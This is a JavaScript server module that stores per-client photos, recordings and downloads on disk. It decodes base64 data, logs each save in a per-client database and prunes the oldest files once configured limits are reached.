// Client Storage Module

import config from '../config/config.js';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import { logger } from '../logs/logs.js';
import { ensureDir } from '../utils/ensureDir.js';
import { downloadsPath, photosPath, recordingsPath } from '../database/path.js';

const getLimit = (type) => {
    const limits = {
        photos: config.limits.maxPhotos,
        recordings: config.limits.maxRecordings,
        downloads: config.limits.maxDownloads
    };
    return limits[type] || 100;
};

const saveFile = (getDb, id, name, buffer, type, size = null) => {
    const dirs = { photos: photosPath, recordings: recordingsPath, downloads: downloadsPath };
    const dir = dirs[type] || downloadsPath;
    const hash = crypto.createHash('md5').update(Date.now().toString()).digest('hex').slice(0, 10);
    const ext = path.extname(name) || '.bin';
    const filename = `${hash}${ext}`;
    const filepath = path.join(dir, filename);

    try {
        ensureDir(dir);

        const data = typeof buffer === 'string' ? Buffer.from(buffer, 'base64') : buffer;
        if (!data || data.length === 0) return null;

        fs.writeFileSync(filepath, data);

        const cdb = getDb(id);
        if (cdb) {
            const listKey = type;
            const list = cdb.get(listKey).value() || [];
            const maxItems = getLimit(type);

            if (list.length >= maxItems) {
                list.slice(0, list.length - maxItems + 1).forEach(item => {
                    try {
                        const oldPath = path.join(dir, path.basename(item.file));
                        if (fs.existsSync(oldPath)) fs.unlinkSync(oldPath);
                    } catch (e) {}
                });
                cdb.set(listKey, list.slice(-maxItems + 1)).write();
            }

            cdb.get(listKey).push({
                name,
                file: `/${type}/${filename}`,
                time: new Date().toISOString(),
                size: size || data.length
            }).write();
        }

        logger.fileSaved(id, name, type);
        return filepath;
    } catch (e) {
        logger.fileSaveFailed(id, name, e.message);
        return null;
    }
};

// Async wrapper for saveFile
const saveFileAsync = async (getDb, id, name, buffer, type, size = null) => {
    return saveFile(getDb, id, name, buffer, type, size);
};

const storage = { saveFile, saveFileAsync };

export default storage;

export { saveFile, saveFileAsync };
